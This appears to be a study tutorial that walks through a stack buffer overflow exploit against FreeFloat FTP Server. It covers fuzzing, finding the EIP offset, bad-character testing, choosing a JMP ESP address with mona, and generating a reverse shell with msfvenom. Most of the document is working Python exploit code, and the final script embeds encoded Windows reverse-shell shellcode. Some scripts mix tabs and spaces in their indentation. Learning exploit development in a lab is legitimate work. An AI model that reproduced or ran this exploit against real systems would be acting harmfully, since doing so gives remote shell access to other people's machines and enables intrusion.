GENERAL STEPS OF BUFFER OVERFLOW (EXAMPLE WITH FreeFloat FTP Server)

1. CRASH
At this point we need to send to vulnerable application a buffer with different sizes until the app crashes. For this we can use a fuzzing python script.
The general structure of script at this point looks like this:

import errno
from os import strerror
from socket import *
import sys
from time import sleep
from struct import pack

size = 100 #defining an initial buffer size

while(size < 500): #using a while loop to keep sending the buffer until it reaches 500 bytes
    try:
      print "\nSending evil buffer with %s bytes" % size
      buffer ="A" * size #defining the buffer as a bunch of As
      s = socket(AF_INET,SOCK_STREAM)
      s.connect(("ip",21)) #establishing connection
      s.recv(2000)
      s.send("USER test\r\n") #sending username
      s.recv(2000)
      s.send("PASS test\r\n") #sending password
      s.recv(2000)
      s.send("REST "+ buffer +"\r\n") #sending rest and buffer
      s.close() #closing the connection
      s = socket(AF_INET,SOCK_STREAM)
      s.connect(("ip",21)) #an additional connection is needed for the crash to occur
      sleep(1) #waiting one second
      s.close() #closing the connection

      size +=100 #increasing the buffer size by 100
      sleep(10) #waiting 10 seconds before repeating the loop

    except: #if a connection can't be made, print an error and exit cleanly
      print "[*]Error in connection with server"
      sys.exit()

From this point we need to know which length of input buffer we must have.

2. IDENTIFYING THE EIP OFFSET

At this point we need to identify which part of the buffer that is being sent is landing in the EIP register, 
in order to then modify it to control the execution flow of the program. Because all that was sent was a bunch of As, 
at the moment there is no way to know what part has overwritten EIP. Command for creating offset: 
msf-pattern_create -l pattern_length
After this need to replace buffer value with generated offset. Now script looks like this:

import errno
from os import strerror
from socket import *
import sys
from time import sleep
from struct import pack

try:
	print "\n[+] Sending evil buffer..."
	buffer = "offset" #defining the buffer as a random pattern
	s = socket(AF_INET,SOCK_STREAM)
	s.connect(("ip",21)) #establishing connection
	s.recv(2000)
	s.send("USER test\r\n") #sending username
	s.recv(2000)
	s.send("PASS test\r\n") #sending password
	s.recv(2000)
	s.send("REST "+ buffer +"\r\n") #sending rest and buffer
	s.close()
	s = socket(AF_INET,SOCK_STREAM)
	s.connect(("ip",21)) #an additional connection is needed for the crash to occur
	sleep(1) #waiting one second
	s.close() #closing the connection
	print "\n[+] Sending buffer of " + str(len(buffer)) + " bytes..."
	print "\n[+] Sending buffer: " + buffer
	print "\n[+] Done!"

except: #if a connection can't be made, print an error and exit cleanly
	print "[*]Error in connection with server"
	sys.exit()

After script executing we must see the EIP value in the debugging tool. With this value we can calculate the exact EIP offset using following command:
msf-pattern_offset -l pattern_length -q EIP_address
Now with this value need to change script on something like this:

import errno
from os import strerror
from socket import *
import sys
from time import sleep
from struct import pack

try:
	print "\n[+] Sending evil buffer..."
	offset = "A" * length #defining the offset value
        EIP = "B" * 4 #EIP placeholder
        padding = "C" * (N - len(offset) - len(EIP)) #adding padding to keep the same buffer size of N bytes
        buffer = offset + EIP + padding #assembling the buffer
        s = socket(AF_INET,SOCK_STREAM)
	s.connect(("ip",21)) #establishing connection
	s.recv(2000)
	s.send("USER test\r\n") #sending username
	s.recv(2000)
	s.send("PASS test\r\n") #sending password
	s.recv(2000)
	s.send("REST "+ buffer +"\r\n") #sending rest and buffer
	s.close()
	s = socket(AF_INET,SOCK_STREAM)
	s.connect(("ip",21)) #an additional connection is needed for the crash to occur
	sleep(1) #waiting one second
	s.close() #closing the connection
	print "\n[+] Sending buffer of " + str(len(buffer)) + " bytes..."
	print "\n[+] Sending buffer: " + buffer
	print "\n[+] Done!"

except: #if a connection can't be made, print an error and exit cleanly
	print "[*]Error in connection with server"
	sys.exit()
	
3. FINDING AVAILABLE SHELLCODE SPACE

A normal reverse shell payload is about 300-400 bytes. Modifying the script, adding about 550 C characters to the script in a new shellcode variable 
and get something like this:

import errno
from os import strerror
from socket import *
import sys
from time import sleep
from struct import pack

try:
	print "\n[+] Sending evil buffer..."
	offset = "A" * length #defining the offset value
        EIP = "B" * 4 #EIP placeholder
        shellcode = "C" * (N - (len(offset) -len(EIP))) #Shellcode placeholder using about 550 Cs
        buffer = offset + EIP + shellcode #assembling the buffer 
        s = socket(AF_INET,SOCK_STREAM)
	s.connect(("ip",21)) #establishing connection
	s.recv(2000)
	s.send("USER test\r\n") #sending username
	s.recv(2000)
	s.send("PASS test\r\n") #sending password
	s.recv(2000)
	s.send("REST "+ buffer +"\r\n") #sending rest and buffer
	s.close()
	s = socket(AF_INET,SOCK_STREAM)
	s.connect(("ip",21)) #an additional connection is needed for the crash to occur
	sleep(1) #waiting one second
	s.close() #closing the connection
	print "\n[+] Sending buffer of " + str(len(buffer)) + " bytes..."
	print "\n[+] Sending buffer: " + buffer
	print "\n[+] Done!"

except: #if a connection can't be made, print an error and exit cleanly
	print "[*]Error in connection with server"
	sys.exit()

To calculate how many C characters made it into ESP, all we need to do is subtract the address where ESP starts to the one where the Cs end.
For example, we can do it with python:
python -c "print(0x029BFE0C - 0x029BFBE4)"

4. TESTING FOR BAD CHARACTERS

Script for testing looks like this:

import errno
from os import strerror
from socket import *
import sys
from time import sleep
from struct import pack

try:
	print "\n[+] Sending evil buffer..."
	offset = "A" * size #defining the offset value
        EIP = "B" * 4 #EIP placeholder
        badchars = (
	"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
	"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
	"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
	"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
	"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
	"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
	"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
	"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
	"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
	"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
	"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
	"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
	"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
	"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
	"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
	"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" ) #adding all possible characters

	buffer = offset + EIP + badchars #assembling the buffer
        s = socket(AF_INET,SOCK_STREAM)
	s.connect(("ip",21)) #establishing connection
	s.recv(2000)
	s.send("USER test\r\n") #sending username
	s.recv(2000)
	s.send("PASS test\r\n") #sending password
	s.recv(2000)
	s.send("REST "+ buffer +"\r\n") #sending rest and buffer
	s.close()
	s = socket(AF_INET,SOCK_STREAM)
	s.connect(("ip",21)) #an additional connection is needed for the crash to occur
	sleep(1) #waiting one second
	s.close() #closing the connection
	print "\n[+] Sending buffer of " + str(len(buffer)) + " bytes..."
	print "\n[+] Sending buffer: " + buffer
	print "\n[+] Done!"

except: #if a connection can't be made, print an error and exit cleanly
	print "[*]Error in connection with server"
	sys.exit()

After this need to right-click on the ESP value and select “Follow in Dump” to follow ESP in the application dump and see if all the characters were sent.
When we find the bad character we delete it from variable and write somewhere. Need to repeat this actions until we get all characters properly.

5. FINDING A JMP ESP RETURN ADDRESS

At this point we need to use mona tool in Immunity Debugger with following commands:
!mona modules (after this need to find an module without protection (all columns equal 'false'))
!mona find -s string_to_search_for -m module_to_search_in (string for jmp esp - '\xff\xe4')
Need to repeat this actions until we find module address without bad characters.
Having correct value need to change script:

import errno
from os import strerror
from socket import *
import sys
from time import sleep
from struct import pack

try:
	print "\n[+] Sending evil buffer..."
	offset = "A" * size #defining the offset value
        EIP = "reverse_address" #EIP placeholder, e.g if we have '0x7734BC0B', then we have '\x0B\xBC\x34\x77'
        shellcode = "C" * (N - (len(offset) -len(EIP))) #Shellcode placeholder using about 550 Cs
        buffer = offset + EIP + shellcode #assembling the buffer
        s = socket(AF_INET,SOCK_STREAM)
	s.connect(("ip",21)) #establishing connection
	s.recv(2000)
	s.send("USER test\r\n") #sending username
	s.recv(2000)
	s.send("PASS test\r\n") #sending password
	s.recv(2000)
	s.send("REST "+ buffer +"\r\n") #sending rest and buffer
	s.close()
	s = socket(AF_INET,SOCK_STREAM)
	s.connect(("ip",21)) #an additional connection is needed for the crash to occur
	sleep(1) #waiting one second
	s.close() #closing the connection
	print "\n[+] Sending buffer of " + str(len(buffer)) + " bytes..."
	print "\n[+] Sending buffer: " + buffer
	print "\n[+] Done!"

except: #if a connection can't be made, print an error and exit cleanly
	print "[*]Error in connection with server"
	sys.exit()

6. GENERATING AND ADDING SHELLCODE

Command for creating python 'shellcode' variable with windows tcp reverse shell: 
msfvenom -p windows/shell_reverse_tcp LHOST=ip LPORT=port -f py -b 'bad_characters' -e x86/shikata_ga_nai -v shellcode

Finally our script looks like this:

import errno
from os import strerror
from socket import *
import sys
from time import sleep
from struct import pack

try:
	print "\n[+] Sending evil buffer..."
	offset = "A" * size #defining the offset value
        EIP = "reverse_address" #EIP placeholder, e.g if we have '0x7734BC0B', then we have '\x0B\xBC\x34\x77'
        shellcode =  b""
	shellcode += b"\xda\xda\xd9\x74\x24\xf4\xb8\x6c\x6d\x17\xbc"
	shellcode += b"\x5b\x2b\xc9\xb1\x52\x31\x43\x17\x83\xeb\xfc"
	shellcode += b"\x03\x2f\x7e\xf5\x49\x53\x68\x7b\xb1\xab\x69"
	shellcode += b"\x1c\x3b\x4e\x58\x1c\x5f\x1b\xcb\xac\x2b\x49"
	shellcode += b"\xe0\x47\x79\x79\x73\x25\x56\x8e\x34\x80\x80"
	shellcode += b"\xa1\xc5\xb9\xf1\xa0\x45\xc0\x25\x02\x77\x0b"
	shellcode += b"\x38\x43\xb0\x76\xb1\x11\x69\xfc\x64\x85\x1e"
	shellcode += b"\x48\xb5\x2e\x6c\x5c\xbd\xd3\x25\x5f\xec\x42"
	shellcode += b"\x3d\x06\x2e\x65\x92\x32\x67\x7d\xf7\x7f\x31"
	shellcode += b"\xf6\xc3\xf4\xc0\xde\x1d\xf4\x6f\x1f\x92\x07"
	shellcode += b"\x71\x58\x15\xf8\x04\x90\x65\x85\x1e\x67\x17"
	shellcode += b"\x51\xaa\x73\xbf\x12\x0c\x5f\x41\xf6\xcb\x14"
	shellcode += b"\x4d\xb3\x98\x72\x52\x42\x4c\x09\x6e\xcf\x73"
	shellcode += b"\xdd\xe6\x8b\x57\xf9\xa3\x48\xf9\x58\x0e\x3e"
	shellcode += b"\x06\xba\xf1\x9f\xa2\xb1\x1c\xcb\xde\x98\x48"
	shellcode += b"\x38\xd3\x22\x89\x56\x64\x51\xbb\xf9\xde\xfd"
	shellcode += b"\xf7\x72\xf9\xfa\xf8\xa8\xbd\x94\x06\x53\xbe"
	shellcode += b"\xbd\xcc\x07\xee\xd5\xe5\x27\x65\x25\x09\xf2"
	shellcode += b"\x2a\x75\xa5\xad\x8a\x25\x05\x1e\x63\x2f\x8a"
	shellcode += b"\x41\x93\x50\x40\xea\x3e\xab\x03\x1f\xbf\xb3"
	shellcode += b"\xbd\x77\xbd\xb3\x40\x33\x48\x55\x28\x53\x1d"
	shellcode += b"\xce\xc5\xca\x04\x84\x74\x12\x93\xe1\xb7\x98"
	shellcode += b"\x10\x16\x79\x69\x5c\x04\xee\x99\x2b\x76\xb9"
	shellcode += b"\xa6\x81\x1e\x25\x34\x4e\xde\x20\x25\xd9\x89"
	shellcode += b"\x65\x9b\x10\x5f\x98\x82\x8a\x7d\x61\x52\xf4"
	shellcode += b"\xc5\xbe\xa7\xfb\xc4\x33\x93\xdf\xd6\x8d\x1c"
	shellcode += b"\x64\x82\x41\x4b\x32\x7c\x24\x25\xf4\xd6\xfe"
	shellcode += b"\x9a\x5e\xbe\x87\xd0\x60\xb8\x87\x3c\x17\x24"
	shellcode += b"\x39\xe9\x6e\x5b\xf6\x7d\x67\x24\xea\x1d\x88"
	shellcode += b"\xff\xae\x2e\xc3\x5d\x86\xa6\x8a\x34\x9a\xaa"
	shellcode += b"\x2c\xe3\xd9\xd2\xae\x01\xa2\x20\xae\x60\xa7"
	shellcode += b"\x6d\x68\x99\xd5\xfe\x1d\x9d\x4a\xfe\x37"
        nops = "\x90" * 20 #NOP Slides
        buffer = offset + EIP + nops + shellcode
        s = socket(AF_INET,SOCK_STREAM)
	s.connect(("ip",21)) #establishing connection
	s.recv(2000)
	s.send("USER test\r\n") #sending username
	s.recv(2000)
	s.send("PASS test\r\n") #sending password
	s.recv(2000)
	s.send("REST "+ buffer +"\r\n") #sending rest and buffer
	s.close()
	s = socket(AF_INET,SOCK_STREAM)
	s.connect(("ip",21)) #an additional connection is needed for the crash to occur
	sleep(1) #waiting one second
	s.close() #closing the connection
	print "\n[+] Sending buffer of " + str(len(buffer)) + " bytes..."
	print "\n[+] Sending buffer: " + buffer
	print "\n[+] Done!"

except: #if a connection can't be made, print an error and exit cleanly
	print "[*]Error in connection with server"
	sys.exit()

